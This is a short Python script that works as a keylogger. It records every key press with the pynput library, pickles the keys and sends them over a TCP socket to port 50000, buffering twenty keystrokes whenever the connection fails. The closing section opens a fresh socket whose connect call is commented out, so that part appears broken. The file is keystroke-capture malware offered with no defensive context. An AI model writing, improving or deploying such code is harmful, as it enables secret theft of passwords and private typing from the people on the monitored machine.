import pickle
import socket
from pynput.keyboard import Listener
my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


class Counter:
    counter = 0


def array():
    a = []
    for i in range(0, 200):
        a.append(str(i))
    return pickle.dumps(a)


def no_safe_key_press(key):
    key = str(key).replace("'", "")
    key = pickle.dumps(key)
    my_socket.send(key)


def no_safe_key(key):
    Counter.counter += 1
    key = str(key).replace("'", "")
    arraya.append(key)
    if Counter.counter >= 20:
        Counter.counter = 0
        return False


arraya = []
while True:
    try:
        my_socket.connect((socket.gethostname(), 50000))
        my_socket.send(pickle.dumps(arraya))
        arraya = []
        break
    except ConnectionRefusedError:
        print("no connection possible")
        with Listener(on_press=no_safe_key)as f:
            f.join()


my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#my_socket.connect((socket.gethostname(), 50000))
with Listener(on_press=no_safe_key_press)as f:
    f.join()